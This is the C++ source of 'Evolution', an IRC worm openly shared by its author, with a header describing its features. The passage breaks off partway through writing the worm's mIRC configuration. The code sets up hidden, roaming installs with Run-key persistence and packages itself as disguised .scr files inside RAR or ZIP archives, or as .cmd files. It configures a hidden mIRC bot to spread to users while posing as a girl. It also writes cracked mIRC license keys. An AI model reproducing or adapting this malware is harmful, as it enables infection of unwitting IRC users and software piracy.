
Contribution - Evolution    [by Xevion]

  

/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

  Projectname:   	Evolution
  Virusname:     	IRC-Xevol, W32/Xevol
  Version:   	        A
  Type:	    	        I-Worm/IRC-Worm (detected as an Trojan)
  Author:		Xevion


  Description:

  Usually I don't code in script languages, but for this virus
  I made an exception. When I saw what was already done in the
  mIRC script language, and what still can be done in it I felt
  the need to code this virus, to let the people know that there
  can be so much more done in it.

  Most of the mIRC viruses that exist today are lame, I'm sorry
  to offend the people who created them but it is true and it
  must been said.
  If you look at the mirc.hlp file for just 5 minutes you can
  create the viruses that are existing today.
  Most of them are looking a lot like this,

  '========================================
  [script]
  ON *:JOIN:#:{ /dcc -c send $nick %virus }
  ON *:TEXT:*:virus:{ /ignore $nick }
  ON *:TEXT:*:infected:{ /ignore $nick }
  '========================================

  If you code it like this way, the virus depends too much on the victim,
  like to what server he is connecting, what channel he is joining
  and the people it is talking to. Also the victim can be noticed by
  other users that he is infected.
  The virus that I created will be totally independent from the victim.

  This virus will change the view on mIRC viruses and let people see
  what really can be done in the mIRC script language.
  I don't say this virus is perfect, in the conterary. It's only
  the beginning of a new era in mIRC viruses.


  Methods used:

  - Can choose a random folder on the victim's rootdrive to install the virus.
  - The virus can "travel" through the victim's sytem. After each reboot the
    virus will delete the regiserty key from the register that was needed to
    start the virus. After that it will choose a new location, copy all files to
    the new location and create a new registery key for it.
  - Downloads an uptodate serverlist and collects all servers from it.
  - Searches .htm and .html files for IRC servers.
  - Registers mIRC if it not already is, so that that annoying pop-up window dissapears.
  - Generates random filenames for all the files. Only the mIRC executable and
    the mirc.ini file are static.
  - Searches for channels with more then 50 ppl on it, makes a list from them
    and joins randomly 10 channels from the ones that were collected.
  - Searches for channels with the word "help" or "mirc" in it, joins all of
    them and floods them.
  - Scans every user that enters and leaves a channel for the mIRC client,
    if the user uses mIRC the user will become a target.
  - Can hold a small conversation with the target, with a few topics to talk about.
  - Can send itself as a .rar archive with 30 random extensions, as a .zip archive,
    and as an .cmd file. The .cmd files are not yet blocked in mIRC, but they
    will only operate on the Windows NT/2000/XP families.
  - As a payload the virus will sound a random line from a poem everytime
    somebody says the word "help" in an channel.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/

#include "Evolution.h"
#include <Xevion.h>

int DirCount=0; //Number of directory's that are collected
int ServerCount=0; //Number of servers that were found

char Me[1024]; //The path to our virus
char Temp[32]; //Character used for temporal storage
char Nick[32]; //The char where the nickname is gonna be stored, we need it for adding a message to our .rar file
char *Cutoff = NULL;
char mIRCexe[1024];
char mIRCdir[1024];
char ServersList[2048]; //A file to store all the servers that has been collected
char Virus[MAX_PATH];
char VirusDir[MAX_PATH];
char CurrentDir[1024];

char DirArray[5000][MAX_PATH]; //An array to store all the directories that were found
char ServerArray[500][MAX_PATH]; //An array for all the IRC servers that were found

char *RandomNick[100] = //100 names of girls to be used as nicknames. IRC is male dominated, so girls make easier contact with our targets
{
	"Ashley","Jessica","Emily","Sarah","Samantha","Brittany","Amanda","Elizabeth","Taylor","Megan","Stephanie","Kayla","Lauren","Jennifer","Rachel","Hannah","Nicole","Amber","Alexis","Courtney","Victoria","Danielle","Alyssa","Rebecca","Jasmine","Katherine","Melissa","Alexandra","Brianna","Chelsea","Michelle","Morgan","Kelsey","Tiffany","Kimberly","Christina","Madison","Heather","Shelby","Anna","Mary","Maria","Allison","Sara","Laura","Andrea","Erin","Hailey","Kaitlyn","Jordan","Natalie","Vanessa","Kelly","Brooke","Erica","Kristen","Julia","Crystal","Amy","Katelyn","Marissa","Lindsey","Paige","Cassandra","Sydney","Katie","Caitlin","Kathryn","Emma","Shannon","Angela","Gabrielle","Jacqueline","Jenna","Jamie","Mariah","Alicia","Briana","Alexandria","Destiny","Miranda","Monica","Brittney","Catherine","Savannah","Sierra","Sabrina","Breanna","Whitney","Caroline","Molly","Madeline","Erika","Grace","Diana","Leah","Angelica","Lindsay","Christine","Kaitlin"
};

char *RandomQuote[10] = //10 quotes that we are gonna use for the quit message
{
	"Viruses don't harm, ignorance do ~ VX Heavens",
	"The best way to predict the future is to invent it ~ Alan Kay",
	"What is now proved was once only imagined ~ William Blake",
	"When you do the common things in life in an uncommon way, you will command the attention of the entire world ~ George Washington Carver",
	"Any man who afflicts the human race with ideas must be prepared to see them misunderstood ~ Henry Mencken",
	"It has become appallingly obvious that our technology has exceeded our humanity ~ Albert Einstein",
	"The only source of knowledge is experience ~ Albert Einstein",
	"The highest form of ignorance is when you reject something you don't know anything about ~ Wayne Dyer",
	"I think computer viruses should count as life. I think it says something about human nature that the only form of life we have created so far is purely destructive. We've created life in our own image. ~ Stephen Hawking",
	"All the world's a stage, and all the men and women merely players ~ Shakespeare"
};
char *RandomEmail[4] = //Well known email networks, to be used for or virus email address
{
	"@msn.com", "@hotmail.com", "@yahoo.com", "@aol.com"
};
char *Extension[6] = //Random extensions for our virus
{
	".exe",".scr",".pif",".cmd",".bat",".com"
};
char *High[26] = //The alphabet in capital letters
{
	"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
};
char *Low[26] = //The alphabet in lowercase letters
{
	"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"
};

void CollectServers(LPCSTR File);
void CollectDirs(LPCSTR DirPath);
void FillDirArray(LPCSTR Directory);
void FillServerArray(LPCSTR Server);
char *VarGenerator(int RandV);
char *FilenameGenerator(int RandF);
void WriteIniFiles(void);
void InfectionRoutine(void);

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	HKEY hKey;
	HMODULE hMe;

	int x;
	int i=0;
	char CurrentFile[64];
	char mIRCpath[1024];

	DWORD mIRCsize = sizeof(mIRCpath);

	std::string File;
	std::string Cut;

	srand((unsigned int)GetTickCount()); //Set TickCount as our random seed

	hMe = GetModuleHandle(NULL);
	GetModuleFileName(hMe, Me, MAX_PATH);

	//Get the path of the mIRC executable
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\mIRC",0,KEY_QUERY_VALUE,&hKey);
	RegQueryValueEx(hKey,"UninstallString",0,NULL,(LPBYTE)mIRCpath,&mIRCsize);
	RegCloseKey(hKey);

	i=1;
	//Remove the uninstall parameters from the collected registery key
	while (mIRCpath[i]!= 0 && mIRCpath[i]!= '"')
	{
		mIRCexe[i-1]=mIRCpath[i];
		i++;
	}
	mIRCexe[i-1]=0; //Store the path to our mIRC executable

	//Get the path of the mIRC directory by cutting off the executable
	strcpy(mIRCdir, mIRCexe); Cutoff = strrchr(mIRCdir,'\\'); *(Cutoff) = '\0';
	//Get the path of our current directory and store it
	strcpy(CurrentDir, Me);	Cutoff = strrchr(CurrentDir,'\\'); *(Cutoff) = '\0';
	//Get the word "virus" from the file virus.exe for example
	_splitpath(Me,0 ,0, CurrentFile, 0);

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&hKey);
    //checks if the word we collected is already stored in the registery
    x = RegQueryValueEx(hKey, CurrentFile,0,NULL,NULL,NULL);
    RegCloseKey(hKey);
    //If so, then the virus has already been executed
	if (x == ERROR_SUCCESS)
    {
    	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey);
		RegDeleteValue(hKey, CurrentFile); //Delete the value from the registery and continue with the normal infection process
		RegCloseKey(hKey);
		/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        Note: We can't delete all our traces because the registery key to the
        mIRC executable stores the one that has last been executed, so if we
        delete everything the virus will crash
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
	}

	CollectDirs("C:\\*"); //Collect all the folders from the root drive

	//Choose a random directory from the ones that were found
	int Random = rand()%DirCount;
	strcpy(VirusDir, DirArray[Random]);
	//Checks if we can make a short path from it (an 8.3 alias)
	int z = GetShortPathName(VirusDir, VirusDir, sizeof(VirusDir));
	//If we can't make a short path, then choose another path and continue until we can
    while (z == 0)
	{
		int Random = rand()%DirCount;
		strcpy(VirusDir, DirArray[Random]);
		int z = GetShortPathName(VirusDir, VirusDir, sizeof(VirusDir));
		/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        Note: We need the short path to create a .rar or zip archive from the
        command line
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
	}

	InfectionRoutine(); //Begina infecting the system
    return 0;
}
void InfectionRoutine(void)
{
	HKEY hKey;

	int x;
	int Random;
	int RandomNumber;

	char Regkey[16] = "";
	char VirusFile[MAX_PATH]="";
	char Parameters[32] = "";
	char VirusExt[MAX_PATH];

	char Serversini[1024];
	char Reboot[MAX_PATH] = "";
	char mIRCbot[MAX_PATH];

	std::string File;
	std::string Cut;

	//Create an directory in the chosen path
	strcpy(Reboot, VirusDir);
    strcat(Reboot, "\\");
    //Create an random directory
	Random = (rand()%26);
	strcat(Reboot, High[Random]);
	RandomNumber = 1 + (rand()%5);
	for(int i = 0; i < RandomNumber; i++)
	{
		Random = (rand()%26);
		strcat (Reboot, Low[Random]);
	}
	CreateDirectory(Reboot, NULL);
	//Make the directory hidden for the victim's eyes
	SetFileAttributes(Reboot, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);

	//Create our random virusname
    strcat(Reboot, "\\");
	strcpy(VirusDir, Reboot);
	strcpy(mIRCbot, Reboot);
	RandomNumber = 2 + (rand()%4);
	for(int j = 0; j < RandomNumber; j++)
	{
		Random = (rand()%26);
		strcat(Reboot, Low[Random]);
		strcat(Regkey, Low[Random]); //Store this name so we can use it later to make an registery key
	}
	Random = (rand()%6);
	strcat(Reboot, Extension[Random]); //Choose an random extension

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,KEY_SET_VALUE, &hKey);
	//Create the registery key, set the executable file as name without the extension so we can detect if the virus has already been executed or not
    RegSetValueEx(hKey, Regkey, 0, REG_SZ, (LPBYTE) Reboot, strlen(Reboot) + 1);
	RegCloseKey(hKey);

	//Get the name of the mIRC excutable without the path, so we get for example "mirc.exe"
	File=mIRCexe;
    Cut=File.substr(File.rfind('\\')+1);
    strcat(mIRCbot, Cut.c_str()); //Add it to our irusdirectory

	CopyFile(Me, Reboot, false); //Copy our virus to it's new location
	CopyFile(mIRCexe, mIRCbot, false); //Copy the mIRC executable to our new location
	//Hide our viurs from the victim's eyes
	SetFileAttributes(Reboot, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);

    //Create a random filename for the file that will has a list of all the collected servers
    strcpy(ServersList, FilenameGenerator(4 + (rand()%6)));

	//Update the servers.ini file in the real mIRC directory
	strcpy(Serversini, mIRCdir);
	strcat(Serversini, "\\servers.ini");
	URLDownloadToFile(0, "http://www.mirc.co.uk/servers.ini", Serversini, 0, 0);
	CollectServers(Serversini); //Collect all the servers from it

	int RN = rand()%11;
	strcpy(Nick, RandomNick[RN]); //Choose a nickname, we already need it to add a comment in our .rar archive

	//Checks if WinRAR is installed
	x = RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\winRAR.exe",0,KEY_QUERY_VALUE,&hKey);
	if (x == ERROR_SUCCESS)
	{
		char RarFile[2048];
		char ReadMe[1024];
		char WinRarExe[1024];
		char WinRarPath[1024];
		DWORD RarExe=sizeof(WinRarExe);
		DWORD RarPath=sizeof(WinRarPath);

		//Get the executable file and the WinRAR directory from the registery
		RegQueryValueEx(hKey, "", 0, NULL,(LPBYTE)WinRarExe, &RarExe);
		RegQueryValueEx(hKey, "", 0, NULL,(LPBYTE)WinRarPath, &RarPath);
		RegCloseKey(hKey);

		//Get the WinRAR executable without the path
		_splitpath(WinRarExe,0,0,WinRarExe,0);
		strcat(WinRarExe, ".exe");

		strcpy(VirusFile, VirusDir);

		//Create a random name for our virus
		Random = (rand()%26);
		strcat(VirusFile, High[Random]);
		RandomNumber = 4 + (rand()%4);
		for(int i = 0; i < RandomNumber; i++)
		{
			Random = (rand()%26);
			strcat (VirusFile, Low[Random]);
		}
		//Adds the number of directory's found to the string, so it will look more like a picture from an digital camera
		itoa(DirCount, VirusExt, 10);
		strcat(VirusFile, VirusExt);
		//Copy the filename, the only difference will be the extension
		strcpy(RarFile, VirusFile);
		strcat(VirusFile, ".scr"); //Adds .scr extension so it would still display the icon

		/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        Note: Adds an extension to our RAR archive, if WinRAR is installed it will
        associate with the extensions .r01 to .r29 + the default .rar extension,
        so those are the ones we can choose from
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
        Random = (rand()%2);
		if (Random==0)
		{
			strcat(RarFile, ".rar");
		}
		else if (Random==1)
		{
			char Temp[16];
			strcat(RarFile, ".r");
			Random = (rand()%3);
			itoa(Random, Temp, 10);
			strcat(RarFile, Temp);
			Random = (rand()%10);
			itoa(Random, Temp, 10);
			strcat(RarFile, Temp);
		}
		//Copy the file that contains the virus to our new location
		CopyFile(Me, VirusFile, false);

		//Create an textfile that we can add ro the RAR archive to give it a personal toutch
		strcpy(ReadMe, VirusDir);
		strcat(ReadMe, "\\Readme.txt");
		ofstream z(ReadMe, ios::app);
		z<< "hey,\nhere it is, i hope you're gonna like it, it's the best! :-)\n\nGreetz,\n";
		z<< Nick; //Adds the nickname that we've chosen before
		z.close();

		//Define the parameters to add the file to the archive
		strcat(Parameters, " m -ep -z");
		strcat(Parameters, ReadMe);
		strcat(Parameters, " ");
		strcat(Parameters, RarFile);
		strcat(Parameters, " ");
		strcat(Parameters, VirusFile);
		//Make the RAR archive
		ShellExecute(0,"open", WinRarExe, Parameters, WinRarPath, SW_HIDE);
		strcpy(Virus, RarFile);
		//Delete the file that we've used to add the comment
		Sleep(700);
		DeleteFile(ReadMe);
	}
	else //If WinRAR isn't installed on the system, then check if WinZip is
	{
		x = RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\winzip32.exe",0,KEY_QUERY_VALUE,&hKey);
		if (x == ERROR_SUCCESS)
		{
		char ZipExe[1024];
		char ZipPath[1024];
		char ZipFile[MAX_PATH];
		DWORD Zip=sizeof(ZipExe);

		//Query the key to get the path to the winzip32.exe file
		RegQueryValueEx(hKey, "", 0, NULL,(LPBYTE)ZipExe, &Zip);

		strcpy(ZipPath, ZipExe);
		//Cutt off the executable file so we only get the pure path
		Cutoff = strrchr(ZipPath,'\\');
		*(Cutoff) = '\0';
		//Get the pure executable file without the path for example "winzip32.exe"
		_splitpath(ZipExe, 0 ,0 ,ZipExe ,0);
		strcat(ZipExe, ".exe");

		strcpy(VirusFile, VirusDir);
		//Create an random filename again
  		Random = (rand()%26);
		strcat(VirusFile, High[Random]);
		RandomNumber = 4 + (rand()%4);
		for(int i = 0; i < RandomNumber; i++)
		{
			Random = (rand()%26);
			strcat (VirusFile, Low[Random]);
		}
		//Adds the number of directory's collected again to the filename
		itoa(DirCount, VirusExt, 10);
		strcat(VirusFile, VirusExt);
		strcpy(ZipFile, VirusFile);
		//Adds the extension to both of the files
		strcat(VirusFile, ".scr");
		strcat(ZipFile, ".zip");
        //Copy our virus to the new location
		CopyFile(Me, VirusFile, false);
		//Define the parameters for moving the virus into the ZIP archive
		strcat(Parameters, " -m -r ");
		strcat(Parameters, ZipFile);
		strcat(Parameters, " ");
		strcat(Parameters, VirusFile);
		//Make the ZIP archive
		ShellExecute(0,"open", ZipExe, Parameters, ZipPath,SW_HIDE);
		strcpy(Virus, ZipFile);
		}
		else //If both WinRAR and WinZip aren't installed on the system, then make an .cmd file
		{
		/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		Note: The extension ".cmd" isn't blocked by default in the mIRC
        application, that means that dumb users still can open the virus without
        any warnings!
        The .cmd extension is the only file extension that still can be used to
        execute malicious code on the targets system. The only drawback is that
        cmd files can only be executed on the Windows NT/2000/XP families
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
		char CmdFile[2048];

		strcpy(CmdFile, VirusDir);
		//Creates an random name for the .cmd file
		Random = (rand()%26);
		strcat(CmdFile, High[Random]);
		RandomNumber = 4 + (rand()%4);
		for(int i = 0; i < RandomNumber; i++)
		{
			Random = (rand()%26);
			strcat (CmdFile, Low[Random]);
		}
		//Adds the number op collected directory's agaian to the filename
		itoa(DirCount, VirusExt, 10);
		strcat(CmdFile, VirusExt);
		strcat(CmdFile, ".cmd");
		//Copy the .cmd file to our new location
		CopyFile(Me, CmdFile, false);
		strcpy(Virus, CmdFile);
		}
		RegCloseKey(hKey);
	}

    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    Checks if the mIRC app is registerd, if it isn't then that damn 30 trial popup
    box is coming up and the viurs will hold until the user clicks on "ok", but
    that would be a little hard because mIRC will be hidden ;)
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
	int b = RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\mIRC\\License", 0, 0, 0,KEY_SET_VALUE, 0, &hKey, 0);
	if (b != REG_OPENED_EXISTING_KEY)
	{
	    //If it isn't registerd choose a random username and sn from the list below
		char License[128] = "";
		char Username[128] = "";

		int Random = rand()%11;
		if (Random == 0)
		{
			strcat(Username, "Cracked");
			strcat(License, "9696-1070977");
		} else if (Random == 1) {
		 	strcat(Username, "anym");
			strcat(License, "7112-832248");
		} else if (Random == 2) {
			strcat(Username, "MIRC32");
			strcat(License, "1893-124286");
		} else if (Random == 3) {
			strcat(Username, "Independant");
			strcat(License, "9320-978866");
		} else if (Random == 4)	{
			strcat(Username, "Psicop");
			strcat(License, "3659-391623");
		} else if (Random == 5)	{
			strcat(Username, "microke");
			strcat(License, "4951-531663");
		} else if (Random == 6)	{
			strcat(Username, "Shaligar^Lash");
			strcat(License, "17631-1901476");
		} else if (Random == 7)	{
			strcat(Username, "C0Ke2000");
			strcat(License, "3379-209721");
		} else if (Random == 8)	{
			strcat(Username, "blastsoft");
			strcat(License, "13895-1663799");
		} else if (Random == 9)	{
			strcat(Username, "Super User");
			strcat(License, "14402-1549895");
		} else if (Random == 10) {
			strcat(Username, "www.demianthecracker.com");
			strcat(License, "21778-2187595");
		}

		RegSetValueEx(hKey, "", 0, REG_SZ, (LPBYTE) License, strlen(License) + 1); //Register the SN
		RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\mIRC\\UserName", 0, 0, 0,KEY_SET_VALUE, 0, &hKey, 0);
		RegSetValueEx(hKey, "", 0, REG_SZ, (LPBYTE) Username, strlen(Username) + 1); //Register the username
	}
	RegCloseKey(hKey);

	WriteIniFiles(); //Write the ini files to configure our virus
	ShellExecute(0,"open",mIRCbot,0,0,SW_HIDE); //Run the virus!
}
char *FilenameGenerator(int RandF) //A function for creating random filenames
{
	int x=0;ZeroMemory(Temp, 32); //Clear the char for temporal storage
	strcpy(Temp, VirusDir);
	if(RandF==0){RandF= 4 + rand()%6;} //If the integer is 0, then change it
	while( x < RandF)
	{
		int Random = (rand()%26);
		strcat(Temp, Low[Random]);
		x++;
	}
	strcat(Temp, "."); //Appends a dot to the string so that we can create an random extension
	for(int y = 0; y < 3; y++) //Create an random exetension
	{
		int Random = (rand()%26);
		strcat(Temp, Low[Random]);
	}
	return Temp; //Return the char where we stored the filename in
}
char *VarGenerator(int RandV) //A function for creating random variables, needed for the dcc string and for the linenumbers of our script.ini
{
	char Number[3];
	int i=0;ZeroMemory(Temp, 32);
	if(RandV==0){RandV= 10 + rand()%10;} //Create an random string for 10 to up to 20 character
	while(i < RandV)//Choose between a selection of capital letters, lowercase letters, and numbers
	{
		int RandomChar = (rand()%3);
		if (RandomChar==0)
		{
			int Random = (rand()%26);
			strcat(Temp, High[Random]);
		}
		else if (RandomChar==1)
		{
			int Random = (rand()%26);
			strcat(Temp, Low[Random]);
		}
		else if (RandomChar==2)
		{
			int Random = (rand()%10);
			itoa(Random, Number, 10);
			strcat(Temp, Number);
		}
		i++;
	}
	return Temp;
}
void WriteIniFiles(void) //Start with writing all the files we need
{
	FILE * Write;

	char Age[12] = "", Anick[64], Quote[512], Email[128], Server[256], mIRCini[2048], Aliasesini[2048], Scriptini[2048], Remoteini[2048], ChannelsList[2048], SpeechFile[2048], FloodChannels[2048];

	int	RS = rand()%ServerCount;
	strcpy(Server, ServerArray[RS]);

	int RQ = rand()%10;
	strcpy(Quote, RandomQuote[RQ]);
	//Create random names for all the files
	strcpy(SpeechFile, FilenameGenerator(4 + (rand()%6)));
	strcpy(ChannelsList, FilenameGenerator(4 + (rand()%6)));
	strcpy(Aliasesini, FilenameGenerator(4 + (rand()%6)));
	strcpy(Scriptini, FilenameGenerator(4 + (rand()%6)));
	strcpy(Remoteini, FilenameGenerator(4 + (rand()%6)));
	strcpy(FloodChannels, FilenameGenerator(4 + (rand()%6)));
	//Start with writing the mirc.ini file
	strcpy(mIRCini, VirusDir);
	strcat(mIRCini, "mirc.ini");
	Write = fopen(mIRCini,"wt");
	fprintf(Write,"[text]\n");
	fprintf(Write,"accept=*.bmp,*.gif,*.jpg,*.log,*.mid,*.mp3,*.png,*.txt,*.wav,*.wma\n");
	//Protect ourselfs from our own virus and others
	fprintf(Write,"ignore=*.exe,*.com,*.bat,*.cmd,*.dll,*.ini,*.mrc,*.vbs,*.js,*.pif,*.scr,*.zip,*.lnk,*.pl,*.shs,*.htm,*.html,*.rar,*.r00,*.r01,*.r02,*.r03,*.r04,*.r05,*.r06,*.r07,*.r08,*.r09,*.r10,*.r11,*.r12,*.r13,*.r14,*.r15,*.r16,*.r17,*.r18,*.r20,*.r21,*.r22,*.r23,*.r24,*.r25,*.r26,*.r27,*.r28,*.r29\n"); // Protect ourselfs from our own and other viruses
	fprintf(Write,"defport=6667\n");
	fprintf(Write,"commandchar=/\n");
	fprintf(Write,"linesep=-\n");
	fprintf(Write,"timestamp=[HH:nn]\n");
	fprintf(Write,"theme=mIRC Classic\n");
	fprintf(Write,"network=\n");
	fprintf(Write,"quit=%s\n", Quote); //Create an random quote when you quit mIRC
	fprintf(Write,"aptitle=[Evolution] created by Xevion\n"); //Displays the name of the project and its creator in the command bar
	fprintf(Write,"[dirs]\n");
	fprintf(Write,"logdir=logs%c\n",92);
	fprintf(Write,"waves=sounds%c\n", 92);
	fprintf(Write,"midis=sounds%c\n", 92);
	fprintf(Write,"mp3s=sounds%c\n", 92);
	fprintf(Write,"wmas=sounds%c\n", 92);
	fprintf(Write,"oggs=sounds%c\n", 92);
	fprintf(Write,"[options]\n"); //Define the options so it will run silently, for more information about the options go to http://www.mishscript.de/help/mircini/
	fprintf(Write,"n0=1,0,0,0,0,0,300,1,1,0,1,0,0,0,2,1,0,1,0,1,8192,0,0,0,0,0,1,1,0,1,1,1,0,0,0\n");
	fprintf(Write,"n1=0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,0,0\n");
	fprintf(Write,"n2=1,0,0,0,0,1,1,1,0,30,60,1,1,1,0,0,0,0,0,5,999,10,0,0,1,1,1,1,0,0,0,0,0,0,0\n");
	fprintf(Write,"n3=200,0,0,0,1,0,1,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,3,13,0,0,0,60,3600,0,0\n");
	fprintf(Write,"n4=0,0,1,1,1,50,9999,0,0,0,1,0,1024,0,1,999,60,0,1,0,1,0,0,0,1,5000,0,0,0,0,0,1,0,0,0,0\n");
	fprintf(Write,"n5=1,1,1,1,1,1,1,1,1,1,6667,0,1,0,0,1,1,0,100,10,3,0,0,24,0,0,1,8192,1,0,0,25,0,0,0\n");
	fprintf(Write,"n6=0,0,11,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0,0,100,1,1,0,0,0,0,0,0,0,0,1,0\n");
	fprintf(Write,"n7=0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,1,70,0,3,0,1,0,0,0,0,0,0,0,0,0,0,1,1,1\n");
	fprintf(Write,"[about]\n");
	fprintf(Write,"version=\n"); //The version information is automaticly added by mIRC
	fprintf(Write,"[agent]\n"); //Disable all this useless shit
	fprintf(Write,"enable=0,0,0\n");
	fprintf(Write,"char=merlin.acs\n");
	fprintf(Write,"lang=0x0409\n");
	fprintf(Write,"options=0,0,0,10,1\n");
	fprintf(Write,"speech=50,10,10,1,250,5,5,0,0,0,0,10,0\n");
	fprintf(Write,"channel=0,0,0,0,0,0,0,0,0\n");
	fprintf(Write,"private=0,0,0,0\n");
	fprintf(Write,"other=0,0,0,0,0,0,0\n");
	fprintf(Write,"pos=20,20\n");
	fprintf(Write,"[windows]\n"); //Mimisize all the windows, and hide them, so if it got detected you won't be able to tell what's happening
	fprintf(Write,"main=1,1,1,1,0,0,0\n");
	fprintf(Write,"wlist=1,1,1,1,1,0,0\n");
	fprintf(Write,"wchannel=1,1,1,1,1,0,0\n");
	fprintf(Write,"scripts=1,1,1,1,1,0,0\n");
	fprintf(Write,"wquery=1,1,1,1,1,0,0\n");
	fprintf(Write,"wserv=1,1,1,1,1,0,0\n");
	fprintf(Write,"wchat=1,1,1,1,1,0,0\n");
	fprintf(Write,"wfinger=1,1,1,1,1,0,0\n");
	fprintf(Write,"wmessage=1,1,1,1,1,0,0\n");
	fprintf(Write,"wlinks=1,1,1,1,1,0,0\n");
	fprintf(Write,"wnotify=1,1,1,1,1,0,0\n");
	fprintf(Write,"wwwwlist=1,1,1,1,1,0,0\n");
	fprintf(Write,"status=1,1,1,1,1,0,0\n");
	fprintf(Write,"[files]\n"); //These are just the default settings, but we won't use any of them, so they won't be created
	fprintf(Write,"servers=servers.ini\n");
	fprintf(Write,"finger=finger.txt\n");
	fprintf(Write,"urls=urls.ini\n");
	fprintf(Write,"addrbk=addrbk.ini\n");
	fprintf(Write,"[mirc]\n"); //The mIRC options part, this part do we need to set the server, nickname, alternative nickname etc.
	fprintf(Write,"host=%s\n", Server); //This is the server that we are going to connect to
	fprintf(Write,"user=%s\n", Nick); //Adds the username to the mirc.ini file

	strcpy(Anick, Nick);
	int RAN = 15 + (rand()%15); //Create an alternative nickname by adding the age to the end of the nickname
	itoa(RAN, Age, 10);
	strcat(Anick, Age);
	strcpy(Email, Anick); //Append an email network to the alternative nick so we that get a email address
	int RE = (rand()%4);
	strcat(Email, RandomEmail[RE]); //Choose a random email network

	fprintf(Write,"email=%s\n", Email); //Use the email address that we generated before
	fprintf(Write,"nick=%s\n", Nick); //Add the nickname that we choose before
 	fprintf(Write,"anick=%s\n", Anick); //Add the alternative nickname
	fprintf(Write,"[dde]\n");
	fprintf(Write,"ServerStatus=off\n");
	fprintf(Write,"ServiceName=mIRC\n");
	fprintf(Write,"CheckName=off\n");
	fprintf(Write,"[pfiles]\n"); //Just the default settings, I've not changed them because we're not gonna use them
	fprintf(Write,"n0=popups.ini\n");
	fprintf(Write,"n1=popups.ini\n");
	fprintf(Write,"n2=popups.ini\n");
	fprintf(Write,"n3=popups.ini\n");
	fprintf(Write,"n4=popups.ini\n");
	fprintf(Write,"[ports]\n");
	fprintf(Write,"dcc=1\n");
	fprintf(Write,"other=0\n");
	fprintf(Write,"random=on\n");
	fprintf(Write,"bind=off\n");
	fprintf(Write,"[ident]\n");
	fprintf(Write,"active=no\n");
	fprintf(Write,"userid=%s\n", Nick); //Use our nickname for ident requests
	fprintf(Write,"system=UNIX\n");
	fprintf(Write,"port=113\n");
	fprintf(Write,"[socks]\n");
	fprintf(Write,"enabled=no\n");
	fprintf(Write,"port=1080\n");
	fprintf(Write,"method=4\n");
	fprintf(Write,"dccs=no\n");
	fprintf(Write,"useip=yes\n");
	fprintf(Write,"[language]\n");
	fprintf(Write,"sjis=0\n");
	fprintf(Write,"multibyte=0\n");
	fprintf(Write,"mbed=0\n");
	fprintf(Write,"[clicks]\n");
	fprintf(Write,"status=/lusers\n");
	fprintf(Write,"query=/whois $$1\n");
	fprintf(Write,"channel=/channel\n");
	fprintf(Write,"nicklist=/query $$1\n");
	fprintf(Write,"notify=/whois $$1\n");
	fprintf(Write,"message=/whois $$1\n");
	fprintf(Write,"[marker]\n");
	fprintf(Write,"show=off\n");
	fprintf(Write,"size=1\n");
	fprintf(Write,"colour=0\n");
